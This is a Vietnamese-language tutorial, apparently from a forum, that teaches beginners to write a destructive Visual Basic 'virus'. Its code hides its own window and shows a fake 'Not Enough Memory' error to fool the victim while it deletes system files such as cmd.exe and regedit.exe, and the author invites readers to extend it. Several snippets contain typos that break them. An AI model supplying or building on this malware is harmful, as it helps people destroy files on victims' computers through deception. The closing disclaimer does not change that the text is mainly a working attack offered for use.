Có lẽ đa số các bạn cho rằng tạo ra một con virus là một việc rất khó khăn đối với những kẻ bắt đầu . Ở bài viết này tôi sẽ hướng dẫn các bạn viết 1 con virus đơn giản chỉ bằng vài đoạn code . 1 virus có thể xóa các file được yêu cầu , và nó có thể nhiễm vào máy của bạn , bạn có thể sẽ phải xóa một vài key file để computer có thể trở lại bình thường .
Trước tiên hãy mở một project mới = Visual Basic , và dạng exe .
Ở project của bạn hãy đặt vào một text box và một button command và 1 timer , chút nữa đây chúng ta sẽ dùng đến button command và timer .
Bây giờ hãy đặt vào project file bạn muốn delete , ví dụ tôi muốn delete Command file , đoạn code của tôi sẽ như sau :
Code:
Private Sub Form_Load() 
Text1.Text = "C:/Windows/System32/cmd.exe 
Kill Text1.Text 
End Sub

như vậy khi project được mở ra thì sẽ tự động xóa command file .
Và bây giờ tôi sẽ cho bạn một ví dụ về làm việc này sử dụng một command button , hãy đặt đoạn code sau đây vào form load và command button của project ( bạn có thể đặt một tên ngắn gọn cho text box , ở đây tôi đặt là A ).
Code:
Private Sub Form_Load() 
Text1.Text = "C/Windows/System32/cmd.exe" 
A = Text1.Text 
End Sub 

Private Sub Command1_Click 
Kill A 
End Sub

Như vậy nghĩa là file cmd.exe chỉ bị xóa khi bạn nhấn vào button . Bây giờ lại nói đến timer mà chúng ta sẽ sử dụng cho con virus này , chúng ta sẽ ngụy trang nó bằng một Message box báo hiệu giả rằng ko đủ memory để chạy nhưng nạn nhân ko biết rằng nó đã xóa command file của họ . Đây là đoạn code :
Code:
Private Sub Form_Load() 
Form1.Visible = False 
Text1.Text = "C:/Windows/System32/cmd.exe" 
A = Text1.Text 
Msgbox ("Runtime Error 492. Not Enough Memory."), vbCritical, "Runtime Error" 
End Sub 

Private Sub Timer1_Timer() 
Timer1.Interval = 5000 
Kill A 
Timer1.Enabled = False 
End Sub

như vậy chúng ta đã tạo ra một message box giả báo động và để cho nó trông thật hơn để nạn nhân ko chú ý chúng ta đã set thời gian là 5 giây cho timer .
Thật đơn giản phải ko các bạn . Các bạn có thể thay đổi và làm virus hoạt động đa dạng hơn theo ý bạn .
Dưới đây tôi sẽ nói về cách làm cho con virus xóa nhiều hơn 1 file như ở trên . Trong form load của project hãy viết đoạn code sau :
Code:
Private Sub Form_Load() 
Form1.Visible = False 
Msgbox ("Runtime Error 492. Not Enough Memory."), vbCritical, "Runtime Error" 
Kill "C:/Windows/System32/cmd.exe" s 
Kill "C:/Windows/regedit.exe" 
End Sub

Virus sẽ tự động xóa file cmd.exe và xóa luôn regedit khi được kích hoạt .
Trên đây là một bài hướng dẫn đơn giản để tạo một virus , các bạn có thể tìm hiểu và làm được nhiều điều hơn , có thể test trên máy của bạn ( nhưng nhớ đừng test trên máy của tôi ) . Chúc vui vẻ và đừng lợi dụng hiểu biết của mình để trở thành 1 kẻ phá hoại .
